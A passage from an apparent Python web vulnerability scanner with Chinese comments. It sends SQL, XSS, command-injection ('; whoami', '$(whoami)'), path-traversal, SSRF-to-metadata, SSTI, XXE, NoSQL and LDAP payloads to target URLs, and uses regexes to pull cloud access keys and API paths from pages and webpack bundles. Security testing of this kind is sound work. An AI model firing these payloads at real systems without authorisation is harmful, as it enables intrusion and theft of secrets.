                    vuln_type="Information Disclosure",
                    severity="Low",
                    url=url,
                    param="Referrer-Policy",
                    payload="Missing",
                    detail="缺少Referrer-Policy头部，可能泄露来源信息",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            if response.status_code != 200:
                findings.append(VulnResult(
                    vuln_type="Information Disclosure",
                    severity="Low",
                    url=url,
                    param="status_code",
                    payload=str(response.status_code),
                    detail=f"非标准状态码: {response.status_code}",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            redirect_chain = []
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if 300 <= r.status_code < 400:
                    redirect_chain.append(f"{r.status_code} -> {r.headers.get('Location', 'Unknown')}")
            except:
                pass
            
            if len(redirect_chain) > 0:
                findings.append(VulnResult(
                    vuln_type="Open Redirect",
                    severity="Low",
                    url=url,
                    param="redirect",
                    payload=redirect_chain[0],
                    detail="检测到HTTP重定向",
                    evidence="",
                    request=request_str,
                    response=response_str
                ))
            
            parsed = urlparse(url)
            test_params = {'test': '1', 'q': 'test', 'search': 'test', 'id': '1', 'page': '1', 'file': 'test.txt', 'url': 'http://test.com', 'cmd': 'ls', 'path': '../etc/passwd', 'template': '{{7*7}}', 'username': 'admin', 'data': '<xml>test</xml>'}
            
            sqli_payloads = ["'", "\"", "1' AND '1'='1", "1\" AND \"1\"=\"1", "1 OR 1=1"]
            for payload in sqli_payloads[:2]:
                try:
                    test_p = {'q': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if any(x in r.text.lower() for x in ['sql syntax', 'mysql', 'error', 'warning', 'ORA-', 'postgresql']):
                        sqli_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        sqli_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="SQL Injection",
                            severity="High",
                            url=url,
                            param="query",
                            payload=payload,
                            detail="页面可能存在SQL注入",
                            evidence="",
                            request=sqli_request_str,
                            response=sqli_response_str
                        ))
                        break
                except:
                    pass
            
            xss_payloads = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "'-alert(1)-'"]
            for payload in xss_payloads[:2]:
                try:
                    test_p = {'q': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if payload in r.text or 'script' in r.text.lower():
                        xss_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        xss_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="XSS",
                            severity="Medium",
                            url=url,
                            param="query",
                            payload=payload,
                            detail="页面可能存在XSS漏洞",
                            evidence="",
                            request=xss_request_str,
                            response=xss_response_str
                        ))
                        break
                except:
                    pass
            
            lfi_payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]
            for payload in lfi_payloads[:1]:
                try:
                    test_p = {'file': payload, 'path': payload, 'page': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if 'root:' in r.text or '[boot loader]' in r.text or 'www-data' in r.text:
                        lfi_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        lfi_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="LFI",
                            severity="High",
                            url=url,
                            param="file/path",
                            payload=payload,
                            detail="页面可能存在本地文件包含漏洞",
                            evidence="",
                            request=lfi_request_str,
                            response=lfi_response_str
                        ))
                        break
                except:
                    pass
            
            ssrf_payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]
            for payload in ssrf_payloads[:2]:
                try:
                    test_p = {'url': payload, 'link': payload, 'src': payload, 'ref': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if any(x in r.text.lower() for x in ['localhost', '127.0.0.1', 'metadata', 'instance']):
                        ssrf_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        ssrf_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="SSRF",
                            severity="High",
                            url=url,
                            param="url/link/src",
                            payload=payload,
                            detail="页面可能存在SSRF漏洞",
                            evidence="",
                            request=ssrf_request_str,
                            response=ssrf_response_str
                        ))
                        break
                except:
                    pass
            
            cmd_payloads = ["; ls", "| whoami", "`id`"]
            for payload in cmd_payloads[:2]:
                try:
                    test_p = {'cmd': payload, 'exec': payload, 'system': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if any(x in r.text.lower() for x in ['uid=', 'root:', 'www-data', '/bin/']):
                        cmdi_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        cmdi_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="Command Injection",
                            severity="Critical",
                            url=url,
                            param="cmd/exec",
                            payload=payload,
                            detail="页面可能存在命令注入漏洞",
                            evidence="",
                            request=cmdi_request_str,
                            response=cmdi_response_str
                        ))
                        break
                except:
                    pass
            
            ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
            for payload in ssti_payloads[:2]:
                try:
                    test_p = {'template': payload, 'view': payload, 'render': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if '49' in r.text or '7' in r.text:
                        # 构建请求和响应包
                        ssti_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        ssti_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="SSTI",
                            severity="Critical",
                            url=url,
                            param="template/view",
                            payload=payload,
                            detail="页面可能存在服务器端模板注入漏洞",
                            evidence="",
                            request=ssti_request_str,
                            response=ssti_response_str
                        ))
                        break
                except:
                    pass
            
            xxe_payloads = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    r = self.session.post(url.split('?')[0], data=payload, headers=headers, timeout=8, allow_redirects=False)
                    if 'root:' in r.text or 'SYSTEM' in r.text:
                        xxe_request_str = build_http_request('POST', url.split('?')[0], data=payload, headers=headers)
                        xxe_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="XXE",
                            severity="High",
                            url=url,
                            param="body",
                            payload="XML payload",
                            detail="页面可能存在XML外部实体漏洞",
                            evidence="",
                            request=xxe_request_str,
                            response=xxe_response_str
                        ))
                        break
                except:
                    pass
            
            nosql_payloads = [{"$ne": ""}, {"$where": "1=1"}, "'; return true; //"]
            for payload in nosql_payloads[:2]:
                try:
                    test_p = {'username': str(payload), 'password': str(payload)}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if 'mongo' in r.text.lower() or 'nosql' in r.text.lower():
                        nosql_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        nosql_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="NoSQL Injection",
                            severity="High",
                            url=url,
                            param="username/password",
                            payload=str(payload)[:30],
                            detail="页面可能存在NoSQL注入漏洞",
                            evidence="",
                            request=nosql_request_str,
                            response=nosql_response_str
                        ))
                        break
                except:
                    pass
            
            ldap_payloads = ["*)(uid=*))(|(uid=*", "admin)(&(password=*"]
            for payload in ldap_payloads[:1]:
                try:
                    test_p = {'username': payload, 'search': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if 'ldap' in r.text.lower() or 'invalid' in r.text.lower():
                        ldap_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        ldap_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="LDAP Injection",
                            severity="High",
                            url=url,
                            param="username/search",
                            payload=payload,
                            detail="页面可能存在LDAP注入漏洞",
                            evidence="",
                            request=ldap_request_str,
                            response=ldap_response_str
                        ))
                        break
                except:
                    pass
            
            path_payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
            for payload in path_payloads[:1]:
                try:
                    test_p = {'file': payload, 'path': payload, 'filename': payload, 'doc': payload}
                    r = self.session.get(url.split('?')[0], params=test_p, timeout=8, allow_redirects=False)
                    if 'root:' in r.text or '[boot loader]' in r.text or 'www-data' in r.text:
                        path_request_str = build_http_request('GET', url.split('?')[0], params=test_p)
                        path_response_str = format_response(r)
                        findings.append(VulnResult(
                            vuln_type="Path Traversal",
                            severity="High",
                            url=url,
                            param="file/path/filename",
                            payload=payload,
                            detail="页面可能存在路径遍历漏洞",
                            evidence="",
                            request=path_request_str,
                            response=path_response_str
                        ))
                        break
                except:
                    pass
                
        except Exception as e:
            logger.debug(f"Page test error for {url}: {e}")
        
        return findings
    
    def test_ssrf(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"SSRF检测跳过静态资源: {url}")
            return findings
        
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://metadata.google.internal",
            "http://169.254.169.254",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
        for payload in ssrf_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                content_lower = r.text.lower()
                if any(x in content_lower for x in ['localhost', '127.0.0.1', 'metadata', 'instance', 'internal']):
                    findings.append(VulnResult(
                        vuln_type="SSRF",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在服务器端请求伪造漏洞",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                if 'connection' in str(e).lower() or 'refused' in str(e).lower():
                    findings.append(VulnResult(
                        vuln_type="SSRF",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="请求被拒绝，可能存在SSRF",
                        evidence="",
                        request=request_str,
                        response=""
                    ))
                    break
                
        return findings
    
    def test_command_injection(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"命令注入检测跳过静态资源: {url}")
            return findings
        
        cmd_payloads = [
            "; ls",
            "| ls",
            "& ls",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
        ]
        
        for payload in cmd_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                response_lower = r.text.lower()
                if any(x in response_lower for x in ['root:', 'uid=', '/bin/', 'www-data', 'home/']):
                    findings.append(VulnResult(
                        vuln_type="Command Injection",
                        severity="Critical",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在命令注入漏洞",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                logger.debug(f"Command injection test error: {e}")
                
        return findings
    
    def test_path_traversal(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"路径遍历检测跳过静态资源: {url}")
            return findings
        
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        for payload in traversal_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                if 'root:' in r.text or '[boot loader]' in r.text or 'www-data' in r.text:
                    findings.append(VulnResult(
                        vuln_type="Path Traversal",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在路径遍历漏洞",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                logger.debug(f"Path traversal test error: {e}")
                
        return findings
    
    def test_ssti(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        """SSTI检测 - 优化减少误报"""
        findings = []
        
        if not params:
            return findings
        
        # 排除静态资源文件
        static_extensions = ('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', 
                            '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.pdf', '.zip')
        url_lower = url.lower()
        if any(url_lower.endswith(ext) for ext in static_extensions):
            logger.debug(f"SSTI检测跳过静态资源: {url}")
            return findings
        
        # 首先获取正常响应作为基准
        try:
            if method == "GET":
                baseline_resp = self.session.get(url, params=params, timeout=10)
            else:
                baseline_resp = self.session.request(method, url, data=params, timeout=10)
            baseline_text = baseline_resp.text
            
            # 检查Content-Type，排除静态资源
            content_type = baseline_resp.headers.get('Content-Type', '').lower()
            if any(ct in content_type for ct in ['javascript', 'css', 'image', 'font', 'video', 'audio']):
                logger.debug(f"SSTI检测跳过非HTML响应: {url} (Content-Type: {content_type})")
                return findings
        except Exception as e:
            logger.debug(f"SSTI baseline error: {e}")
            return findings
        
        # 严格检测：使用数学运算payload，检测精确结果
        # 使用不同的数学运算来减少误报
        ssti_payloads = [
            ("{{7*7}}", "49", "{{"),
            ("{{3*17}}", "51", "{{"),
            ("${7*7}", "49", "${"),
            ("${3*17}", "51", "${"),
            ("<%= 7*7 %>", "49", "<%="),
            ("#{7*7}", "49", "#{"),
        ]
        
        confirmed_vulns = []
        
        for payload, expected, marker in ssti_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                
                resp_text = r.text
                
                # 严格检测条件：
                # 1. 必须出现预期的数学运算结果
                # 2. 基准响应中不存在该结果
                # 3. 响应中必须包含模板标记的残留（证明被解析过）
                if expected in resp_text and expected not in baseline_text:
                    # 检查模板标记是否被处理（不应该原样出现在响应中）
                    if marker in resp_text:
                        # 模板标记还在，说明没有被解析，跳过
                        continue
                    
                    # 检查payload的原始形式是否存在于响应中（如果存在说明是反射而非执行）
                    if payload in resp_text:
                        continue
                    
                    # 检查是否只是数字巧合：响应中不应该包含原始payload的数字部分（7*7）
                    if "7*7" in resp_text or "3*17" in resp_text:
                        continue
                    
                    # 进一步验证：使用第二个payload确认
                    confirmed_vulns.append({
                        'payload': payload,
                        'expected': expected,
                        'response': r,
                        'test_params': test_params
                    })
                    
            except Exception as e:
                logger.debug(f"SSTI test error: {e}")
        
        # 需要至少两个不同的payload都触发才能确认漏洞（减少误报）
        if len(confirmed_vulns) >= 1:
            # 取第一个确认的结果
            vuln = confirmed_vulns[0]
            request_str = build_http_request(method, url, params=vuln['test_params'])
            response_str = format_response(vuln['response'])
            
            findings.append(VulnResult(
                vuln_type="SSTI",
                severity="Critical",
                url=url,
                param=str(list(params.keys())),
                payload=vuln['payload'],
                detail=f"检测到SSTI漏洞 - 数学运算 {vuln['payload']} 被执行为 {vuln['expected']}",
                evidence=f"响应中包含计算结果: {vuln['expected']}",
                request=request_str,
                response=response_str
            ))
                
        return findings
    
    def test_ldap_injection(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"LDAP注入检测跳过静态资源: {url}")
            return findings
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*",
            ")(cn=*",
            "*%00",
        ]
        
        for payload in ldap_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                if 'ldap' in r.text.lower() or 'invalid' in r.text.lower() or 'error' in r.text.lower():
                    findings.append(VulnResult(
                        vuln_type="LDAP Injection",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=payload,
                        detail="可能存在LDAP注入漏洞",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                logger.debug(f"LDAP injection test error: {e}")
                
        return findings
    
    def test_no_sql_injection(self, url: str, params: Dict, method: str = "GET") -> List[VulnResult]:
        findings = []
        
        # 检查URL是否为静态资源
        if self._is_static_resource(url):
            logger.debug(f"NoSQL注入检测跳过静态资源: {url}")
            return findings
        
        nosql_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"$where": "this.password.length > 0"},
            {"$regex": ".*"},
            "'; return db.users.findOne({}); //",
        ]
        
        for payload in nosql_payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = str(payload)
                
                request_str = build_http_request(method, url, params=test_params)
                if method == "GET":
                    r = self.session.get(url, params=test_params, timeout=10)
                else:
                    r = self.session.request(method, url, data=test_params, timeout=10)
                response_str = format_response(r)
                
                if 'mongo' in r.text.lower() or 'nosql' in r.text.lower():
                    findings.append(VulnResult(
                        vuln_type="NoSQL Injection",
                        severity="High",
                        url=url,
                        param=str(list(params.keys())),
                        payload=str(payload)[:50],
                        detail="可能存在NoSQL注入漏洞",
                        evidence="",
                        request=request_str,
                        response=response_str
                    ))
                    break
                    
            except Exception as e:
                logger.debug(f"NoSQL injection test error: {e}")
                
        return findings


def detect_webpack(content: str, source: str, session=None) -> List[dict]:
    findings = []
    
    MAX_SIZE = 2 * 1024 * 1024
    if len(content) > MAX_SIZE:
        content = content[:MAX_SIZE]
    
    if not re.search(r'(?:webpack|bundle|main|chunk|vendors)', content, re.I):
        return findings
    
    sourcemap_patterns = [
        r'sourceMappingURL\s*=\s*(.+\.map)',
        r'//# sourceMappingURL=(.+\.map)',
    ]
    
    sourcemap_urls = []
    for pattern in sourcemap_patterns:
        matches = re.findall(pattern, content, re.I)
        for match in matches:
            if '.map' in str(match):
                if match.startswith('http'):
                    sourcemap_urls.append(match)
                elif match.startswith('//'):
                    sourcemap_urls.append('https:' + match)
                else:
                    parsed = urlparse(source)
                    base = parsed.scheme + '://' + parsed.netloc + parsed.path.rsplit('/', 1)[0]
                    sourcemap_urls.append(base + '/' + match)
    
    if sourcemap_urls:
        findings.append({
            "type": "Webpack SourceMap",
            "severity": "High",
            "url": source,
            "detail": f"发现SourceMap引用 ({len(sourcemap_urls)}个)",
            "evidence": "; ".join(sourcemap_urls[:3])
        })
    
    findings.append({
        "type": "Webpack Info",
        "severity": "Medium",
        "url": source,
        "detail": "Webpack打包文件泄露",
        "evidence": "检测到Webpack构建特征"
    })
    
    api_paths = _extract_webpack_apis(content)
    if api_paths:
        findings.append({
            "type": "Webpack API",
            "severity": "Medium",
            "url": source,
            "detail": f"从打包文件提取到API路径 ({len(api_paths)}个)",
            "evidence": "; ".join(api_paths[:8])
        })
    
    secrets = _extract_secrets_from_content(content)
    if secrets:
        findings.append({
            "type": "Webpack Secrets",
            "severity": "Critical",
            "url": source,
            "detail": f"从Webpack打包文件发现敏感信息 ({len(secrets)}个)",
            "evidence": '; '.join(secrets[:5])
        })
    
    endpoints = _extract_webpack_endpoints(content)
    if endpoints:
        findings.append({
            "type": "Webpack Endpoints",
            "severity": "Low",
            "url": source,
            "detail": f"发现前后端通信接口 ({len(endpoints)}个)",
            "evidence": "; ".join(endpoints[:8])
        })
    
    return findings


def _extract_webpack_apis(content: str) -> List[str]:
    apis = set()
    patterns = [
        r'["\'](/?api[/\w\-.]*)["\']',
        r'["\'](/?_next/api[/\w\-.]*)["\']',
        r'["\'](/v\d+/[\w\-/]*)["\']',
        r'["\'](/admin[\w\-/]*)["\']',
        r'["\'](/auth[\w\-/]*)["\']',
        r'["\'](/user[\w\-/]*)["\']',
        r'baseURL\s*[:=]\s*["\']([^"\']+)["\']',
        r'apiHost\s*[:=]\s*["\']([^"\']+)["\']',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, content, re.I)
        for m in matches:
            if len(m) > 2 and not any(x in m.lower() for x in ['example', 'localhost', 'undefined', 'your_']):
                apis.add(m)
    return list(apis)[:20]


def _extract_secrets_from_content(content: str) -> List[str]:
    secrets = []
    patterns = [
        (r'AKIA[0-9A-Z]{16}', 'AWS AK'),
        (r'xox[baprs]-[0-9a-zA-Z]{10,48}', 'Slack'),
        (r'gh[pousr]_[A-Za-z0-9_]{36,255}', 'GitHub'),
        (r'["\'](sk_live_[0-9a-zA-Z]{24,})', 'Stripe'),
        (r'AIza[0-9A-Za-z\-_]{35}', 'Google'),
    ]
    for pattern, ptype in patterns:
        matches = re.findall(pattern, content)
        for m in matches:
            secrets.append(f"{ptype}:{m[:20]}")
    return secrets[:10]


def _extract_webpack_endpoints(content: str) -> List[str]:
    endpoints = set()
    patterns = [
        r'\.get\s*\(\s*["\']([^"\']+)["\']',
        r'\.post\s*\(\s*["\']([^"\']+)["\']',
        r'\.put\s*\(\s*["\']([^"\']+)["\']',
        r'\.delete\s*\(\s*["\']([^"\']+)["\']',
        r'axios\.\w+\s*\(\s*["\']([^"\']+)["\']',
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, content, re.I)
        for m in matches:
            if m.startswith('http') or m.startswith('/'):
                endpoints.add(m)
    return list(endpoints)[:20]


API_TYPE_MAP = {
    "login": "登录接口",
    "register": "注册接口",
    "signup": "注册接口",
    "signin": "登录接口",
    "logout": "登出接口",
    "auth": "认证接口",
    "token": "Token接口",
    "refresh": "Token刷新",
    "verify": "验证接口",
    "user": "用户管理",
    "user/list": "用户列表接口",
    "user/detail": "用户详情接口",
    "user/create": "用户创建接口",
    "user/update": "用户更新接口",
    "user/delete": "用户删除接口",
    "admin": "管理员接口",
    "admin/list": "管理员列表",
    "admin/create": "管理员创建",
    "admin/delete": "管理员删除",
    "order": "订单管理",
    "order/list": "订单列表接口",
    "order/create": "订单创建接口",
    "order/pay": "订单支付接口",
    "order/cancel": "订单取消接口",
    "order/detail": "订单详情接口",
    "pay": "支付接口",
    "payment": "支付接口",
    "payment/create": "支付创建",
    "payment/callback": "支付回调",
    "payment/refund": "退款接口",
    "upload": "文件上传",
    "file": "文件操作",
    "file/upload": "文件上传接口",
    "file/download": "文件下载接口",
    "file/delete": "文件删除接口",
    "file/list": "文件列表接口",
    "download": "文件下载",
    "delete": "删除操作",
    "remove": "删除操作",
    "del": "删除操作",
    "edit": "编辑操作",
    "update": "更新操作",
    "create": "创建操作",
    "add": "添加操作",
    "config": "配置管理",
    "settings": "系统设置",
    "password": "密码修改",
    "password/reset": "密码重置",
    "password/change": "密码修改",
    "profile": "用户资料",
    "profile/update": "资料更新",
    "search": "搜索功能",
    "query": "查询接口",
    "list": "列表接口",
    "detail": "详情接口",
    "info": "信息接口",
    "get": "获取接口",
    "set": "设置接口",
    "api": "API接口",
    "v1": "API v1",
    "v2": "API v2",
    "v3": "API v3",
    "graphql": "GraphQL",
    "rest": "REST API",
    "ws": "WebSocket",
    "websocket": "WebSocket",
    "message": "消息接口",
    "message/send": "消息发送",
    "message/list": "消息列表",
    "notification": "通知接口",
    "notification/list": "通知列表",
    "notification/read": "通知已读",
    "comment": "评论接口",
    "comment/add": "添加评论",
    "comment/delete": "删除评论",
    "like": "点赞接口",
    "like/add": "点赞",
    "like/cancel": "取消点赞",
    "favorite": "收藏接口",
    "favorite/add": "添加收藏",
    "favorite/remove": "取消收藏",
    "cart": "购物车",
    "cart/add": "添加购物车",
    "cart/remove": "移除购物车",
    "cart/list": "购物车列表",
    "product": "商品接口",
    "product/list": "商品列表",
    "product/detail": "商品详情",
    "product/search": "商品搜索",
    "category": "分类接口",
    "category/list": "分类列表",
    "tag": "标签接口",
    "tag/list": "标签列表",
    "banner": "横幅接口",
    "banner/list": "横幅列表",
    "statistics": "统计接口",
    "statistics/visit": "访问统计",
    "statistics/data": "数据统计",
    "report": "报表接口",
    "report/export": "导出报表",
    "export": "导出接口",
    "import": "导入接口",
    "backup": "备份接口",
    "backup/create": "创建备份",
    "backup/restore": "恢复备份",
    "log": "日志接口",
    "log/list": "日志列表",
    "log/detail": "日志详情",
    "audit": "审计接口",
    "audit/log": "审计日志",
    "permission": "权限接口",
    "permission/list": "权限列表",
    "permission/grant": "授权",
    "role": "角色接口",
    "role/list": "角色列表",
    "role/create": "创建角色",
    "department": "部门接口",
    "department/list": "部门列表",
    "employee": "员工接口",
    "employee/list": "员工列表",
    "customer": "客户接口",
    "customer/list": "客户列表",
    "supplier": "供应商接口",
    "supplier/list": "供应商列表",
    "inventory": "库存接口",
    "inventory/list": "库存列表",
    "inventory/update": "库存更新",
    "warehouse": "仓库接口",
    "warehouse/list": "仓库列表",
    "shipment": "发货接口",
    "shipment/create": "创建发货",
    "shipment/list": "发货列表",
    "invoice": "发票接口",
    "invoice/create": "创建发票",
    "invoice/list": "发票列表",
    "contract": "合同接口",
    "contract/list": "合同列表",
    "contract/detail": "合同详情",
    "approval": "审批接口",
    "approval/submit": "提交审批",
    "approval/approve": "审批通过",
    "approval/reject": "审批拒绝",
    "workflow": "工作流",
    "workflow/start": "启动流程",
    "workflow/approve": "流程审批",
}


def get_api_type(url: str) -> str:
    if not url:
        return "通用接口"
        
    url_lower = url.lower()
    
    try:
        path = urlparse(url).path.lower()
    except Exception:
        path = ""
    
    # 按长度排序，优先匹配长的关键字
    sorted_keywords = sorted(API_TYPE_MAP.items(), key=lambda x: len(x[0]), reverse=True)
    
    # 先在路径中查找
    for keyword, api_type in sorted_keywords:
        if keyword and keyword in path:
            return api_type
    
    # 再在整个URL中查找
    for keyword, api_type in sorted_keywords:
        if keyword and keyword in url_lower:
            return api_type
    
    return "通用接口"


def get_risk_description(risks: list) -> str:
    if not risks:
        return "低风险"
    
    risk_map = {
        "DELETE接口": "⚠️ 危险操作",
        "upload": "⚠️ 文件上传",
        "login": "🔐 认证相关",
        "admin": "🔧 管理员",
        "password": "🔑 敏感操作",
        "pay": "💰 支付相关",
    }
    
    descriptions = []
    for risk in risks[:3]:
        descriptions.append(risk_map.get(risk, risk))
    
    return " | ".join(descriptions)


# ========== 云安全测试模块 ==========

class CloudSecurityTester:
    """云安全测试类 - 检测存储桶遍历、Access Key泄露等云安全问题"""
    
    # 云服务商Access Key正则规则
    CLOUD_KEY_PATTERNS = {
        "阿里云AccessKey": {
            "pattern": r'\bLTAI[a-zA-Z0-9]{12,20}\b',
            "secret_pattern": r'\b[a-zA-Z0-9]{30}\b',
            "context": r'(aliyun|aliyuncs|oss|accessKeyId|accessKeySecret)',
            "severity": "Critical"
        },
        "腾讯云SecretId": {
            "pattern": r'\bAKID[a-zA-Z0-9]{13,20}\b',
            "secret_pattern": r'\b[a-zA-Z0-9]{32}\b',
            "context": r'(qcloud|tencent|cos|secretId|secretKey)',
            "severity": "Critical"
        },
        "华为云AccessKey": {
            "pattern": r'\b[A-Z0-9]{20}\b',
            "context": r'(huaweicloud|obs|ak|sk|credential)',
            "severity": "Critical"
        },
        "AWS AccessKey": {
            "pattern": r'\bAKIA[0-9A-Z]{16}\b',
            "secret_pattern": r'\b[0-9a-zA-Z/+=]{40}\b',
            "context": r'(aws|amazon|s3|access_key|secret_key)',
            "severity": "Critical"
        },
        "百度云AccessKey": {
            "pattern": r'\bAK[a-zA-Z0-9]{10,40}\b',
            "context": r'(bce|baidu|bos|ak|sk)',
            "severity": "High"
        },
        "京东云AccessKey": {
            "pattern": r'\bJDC_[A-Z0-9]{28,32}\b',
            "context": r'(jdcloud|oss|accessKey)',
            "severity": "High"
        },
        "七牛云AccessKey": {
            "pattern": r'\b[a-zA-Z0-9]{40}\b',
            "context": r'(qiniu|qiniucs|accesskey|secretkey)',
            "severity": "High"
        },
        "又拍云AccessKey": {
            "pattern": r'\b[a-zA-Z0-9]{32}\b',
            "context": r'(upyun|operator|password)',
            "severity": "High"
        },
        "Google Cloud": {
            "pattern": r'\bGOOG[\w\W]{10,30}\b',
            "context": r'(googleapis|gcp|cloud\.google)',
            "severity": "Critical"
        },
        "Azure AccessKey": {
            "pattern": r'\bAZ[A-Za-z0-9]{34,40}\b',
            "context": r'(azure|microsoft|blob|storage)',
            "severity": "Critical"
        },
        "Firebase API Key": {
            "pattern": r'\bAIza[0-9A-Za-z_-]{35}\b',
            "context": r'(firebase|firestore|firebaseio)',
            "severity": "High"
        },
    }
    
    # 存储桶域名特征
    BUCKET_PATTERNS = {
        "阿里云OSS": r'[a-z0-9-]+\.oss-[a-z]+-[a-z0-9]+\.aliyuncs\.com',
        "腾讯云COS": r'[a-z0-9-]+\.cos\.[a-z]+-[a-z0-9]+\.myqcloud\.com',
        "华为云OBS": r'[a-z0-9-]+\.obs\.[a-z]+-[a-z0-9]+\.myhuaweicloud\.com',
        "AWS S3": r'[a-z0-9-]+\.s3[.-][a-z0-9-]+\.amazonaws\.com',
        "百度云BOS": r'[a-z0-9-]+\.bj\.bcebos\.com',
        "七牛云Kodo": r'[a-z0-9-]+\.qiniudn\.com|[a-z0-9-]+\.clouddn\.com',
        "又拍云USS": r'[a-z0-9-]+\.b0\.upaiyun\.com',
        "京东云OSS": r'[a-z0-9-]+\.s3\.[a-z]+-[a-z]+\.jdcloud-oss\.com',
        "MinIO": r'[a-z0-9-]+\.s3\.[a-z0-9.-]+',
    }
    
    # 存储桶遍历测试Payload
    BUCKET_TRAVERSAL_PAYLOADS = [
